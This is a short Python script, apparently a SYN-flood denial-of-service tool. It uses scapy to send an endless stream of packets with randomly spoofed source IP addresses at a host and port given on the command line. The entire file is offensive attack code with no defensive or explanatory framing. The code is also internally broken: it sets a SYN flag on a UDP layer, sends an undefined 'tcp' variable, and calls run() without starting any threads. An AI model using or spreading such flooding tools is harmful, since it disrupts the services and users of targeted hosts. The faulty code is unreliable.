from __future__ import print_function
import sys, socket, random, threading
from scapy.all import *


class SynFlood (threading.Thread):
    def __init__(self, host, port):
        threading.Thread.__init__(self)

        self.host = host
        self.port = port

    def run(self):
        ip = IP()
        ip.src = "%d.%d.%d.%d" % (random.randint(1,254), random.randint(1,254), random.randint(1,254), random.randint(1,254))
        ip.dst = self.host

        udp = UDP()
        udp.sport = random.randint(1, 65535)
        udp.dport = self.port
        udp.flags = "S"

        send(ip/tcp, verbose=0)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print ("[!] Usage: python", __file__, "<host> <port>")
        sys.exit(0)

    try:
        host = sys.argv[1]
        socket.inet_aton(host)
    except socket.error:
        print ("[!] IP missing!")
        sys.exit(0)

    try:
        port = int(sys.argv[2])
    except ValueError:
        print ("[!] Port missing!")
        sys.exit(0)

    total = 0
    conf.iface = "en0"
    try:
        while True:
            SynFlood(host, port).run()
            total += 1
            print ("Packets sent:\t\t%d" % total, end='\r')
    except KeyboardInterrupt:
        print ("\n[!] Exiting...")
        sys.exit(0)